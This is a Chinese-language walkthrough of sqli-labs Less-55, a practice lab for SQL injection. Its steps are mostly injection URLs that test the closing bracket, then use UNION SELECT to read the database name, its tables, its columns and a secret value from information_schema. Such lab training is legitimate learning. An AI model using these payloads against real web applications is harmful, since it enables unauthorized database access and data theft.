---
title: Less - 55
date: 2023-03-24T13:27:58Z
lastmod: 2023-03-24T19:08:07Z
---

# Less - 55

---

# 通关教程

---

## 1、判断闭合方式

---

```http
http://192.168.23.128/sqli-labs/Less-55/?id=1--+ #回显错误
http://192.168.23.128/sqli-labs/Less-55/?id=1'--+ #回显错误
http://192.168.23.128/sqli-labs/Less-55/?id=1"--+ #回显错误
http://192.168.23.128/sqli-labs/Less-55/?id=1)--+ #回显正常
```

​![image](assets/image-20230324133233-3im60nv.png)​所以判断这里为数字型注入

---

## 2、查看当前库

---

```http
http://192.168.23.128/sqli-labs/Less-55/?id=-1) union select 1,2,database()--+
```

​![image](assets/image-20230324190345-63gam22.png)​

---

## 3、查看challenges库下的所有表

---

```http
http://192.168.23.128/sqli-labs/Less-55/?id=-1) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')--+
```

​![image](assets/image-20230324190428-rex1c1a.png)​

---

## 4、查看fmu3heha81表下的所有字段

---

```http
http://192.168.23.128/sqli-labs/Less-55/?id=-1) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='fmu3heha81')--+
```

​![image](assets/image-20230324190548-u1lxcmd.png)​

---

## 5、查看secret_A4Z0字段下的值

---

```http
http://192.168.23.128/sqli-labs/Less-55/?id=-1) union select 1,2,(select group_concat(secret_A4Z0) from challenges.fmu3heha81)--+
```

​![image](assets/image-20230324190723-c18lrz4.png)​

​![image](assets/image-20230324190805-z9bm7wc.png)​

‍
